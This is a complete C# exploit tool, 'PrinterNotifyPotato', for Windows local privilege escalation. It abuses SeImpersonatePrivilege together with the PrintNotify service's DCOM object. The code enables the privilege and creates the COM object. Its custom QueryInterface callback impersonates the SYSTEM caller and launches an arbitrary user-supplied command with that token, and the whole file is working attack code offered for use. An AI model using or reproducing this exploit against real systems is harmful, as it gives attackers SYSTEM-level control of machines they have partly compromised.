using System;
using System.Data;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;

namespace Zcg.Exploits.Local
{
    //some code from BCL and pinvoke.net
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }
    #region interop
    static class NativeMethods
    {
        [DllImport("ole32.dll")]
        public static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, int dwAuthnLevel, int dwImpLevel, IntPtr pAuthList, int dwCapabilities, IntPtr pReserved3);
        [DllImport("ole32.dll", ExactSpelling = true)]
        public static extern int CoCreateInstance([In, MarshalAs(UnmanagedType.LPStruct)] Guid clsid, [MarshalAs(UnmanagedType.Interface)] object punkOuter, int context, [In, MarshalAs(UnmanagedType.LPStruct)] Guid iid, [MarshalAs(UnmanagedType.Interface)] out object punk);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr token);
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool LogonUser(string username, string domain, string password, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
        [DllImport("ole32.dll")]
        public static extern int CoImpersonateClient();
        [DllImport("ole32.dll")]
        public static extern int CoRevertToSelf();
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, ulong logon, [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName, [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine, Int32 dwCreationFlags, IntPtr lpEnvrionment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }
    #endregion
    class CustomQIHolder : ICustomQueryInterface
    {
        string _command = null;
        public CustomQIHolder(string command)
        {
            _command = command;
        }
        public CustomQueryInterfaceResult GetInterface(ref Guid iid, out IntPtr ppv)
        {
            NativeMethods.CoImpersonateClient();
            var identity = WindowsIdentity.GetCurrent();
            if (identity.IsSystem)
            {
                IntPtr tkn = identity.Token;
                Console.WriteLine("[+] Get Token: " + tkn);
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.pSecurityDescriptor = IntPtr.Zero;
                sa.bInheritHandle = 1;
                IntPtr hRead, hWrite;
                NativeMethods.CreatePipe(out hRead, out hWrite, ref sa, 1024);
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.hStdError = hWrite;
                si.hStdOutput = hWrite;
                si.lpDesktop = "WinSta0\\Default";
                si.dwFlags = 0x101;
                si.wShowWindow = 0;
                if (NativeMethods.CreateProcessWithTokenW(tkn, 2, null, _command, 0, IntPtr.Zero, null, ref si, ref pi))
                {
                    Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
                    var tn = new Thread(ReadThread);
                    tn.IsBackground = true;
                    tn.Start(hRead);
                    new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                    tn.Abort();
                    NativeMethods.CloseHandle(pi.hProcess);
                    NativeMethods.CloseHandle(pi.hThread);
                    NativeMethods.CloseHandle(tkn);
                    NativeMethods.CloseHandle(hWrite);
                    NativeMethods.CloseHandle(hRead);
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[x] CreateProcessWithTokenW err:" + Marshal.GetLastWin32Error());
                }
            }
            NativeMethods.CoRevertToSelf();
            ppv = IntPtr.Zero;
            return CustomQueryInterfaceResult.NotHandled;
        }
        static void ReadThread(object o)
        {
#pragma warning disable 0618
            FileStream fs = new FileStream((IntPtr)o, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }
    }

    class PrinterNotifyPotato
    {
        static unsafe void Main(string[] args)
        {
            Console.WriteLine("Exploit for PrinterNotify Service DCOM Object local privalege escalation vulnerability(by SeImpersonatePrivilege abuse).");
            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
            if (args.Length < 1)
            {
                Console.WriteLine("usage: PrinterNotifyPotato <cmd>");
                Console.WriteLine();
                return;
            }
            try
            {
                NativeMethods.CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, 0, 3, IntPtr.Zero, 0x40, IntPtr.Zero);
                LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
                using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("[+] Current user: " + wi.Name);
                    NativeMethods.LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Privileges = l;
                    l[0].Attributes = 2;
                    if (!NativeMethods.AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                    {
                        Console.WriteLine("[x] SeImpersonatePrivilege not held.");
                        return;
                    }
                }
                var CLSID_PrintNotifyService = new Guid("{854A20FB-2D44-457D-992F-EF13785D2B51}");
                IntPtr token = IntPtr.Zero;
                if (!NativeMethods.LogonUser("X", "X", "X", 9, 3, ref token) || !NativeMethods.ImpersonateLoggedOnUser(token))
                {
                    Console.WriteLine("[x] logon as interactive error.");
                    return;
                }

                object obj = null;
                var hr = NativeMethods.CoCreateInstance(CLSID_PrintNotifyService, null, 4, new Guid("00000000-0000-0000-C000-000000000046"), out obj);
                if (hr != 0)
                {
                    Console.WriteLine("[x] CoCreateInstance fail with HRESULT: 0x" + hr.ToString("x"));
                    return;
                }
                var svc = obj as IConnectionPointContainer;
                IEnumConnectionPoints pEnumConnectionPoints;
                svc.EnumConnectionPoints(out pEnumConnectionPoints);
                int num = 1;
                hr = 0;
                int d = 0;
                IConnectionPoint[] arr = new IConnectionPoint[1];
                hr = pEnumConnectionPoints.Next(num, arr, (IntPtr)(&d));
                var holder = new CustomQIHolder(args[0]);
                do
                {
                    if (arr[0] != null)
                    {
                        try { arr[0].Advise(holder, out d); }
                        catch { }
                        break;
                    }
                    hr = pEnumConnectionPoints.Next(num, arr, (IntPtr)(&d));
                } while (hr == 0);

            }
            catch (Exception ex)
            {
                Console.WriteLine("[x] " + ex);
            }
        }
    }
}